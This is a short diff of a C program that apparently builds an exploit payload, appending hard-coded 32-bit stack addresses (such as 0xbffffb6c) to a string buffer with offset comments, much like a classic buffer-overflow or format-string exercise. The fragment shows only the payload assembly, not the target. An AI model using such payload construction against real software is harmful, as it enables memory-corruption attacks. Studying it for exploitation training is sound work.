@@ -32,6 +32,8 @@ int main(void)
   	strcat(str, "\x6f\xfb\xff\xbf");
     // - 153
   	strcat(str, "\x6d\xfb\xff\xbf");
+    // - 154
+  	strcat(str, "\x6c\xfb\xff\xbf");
 
 
     // bffffbd4
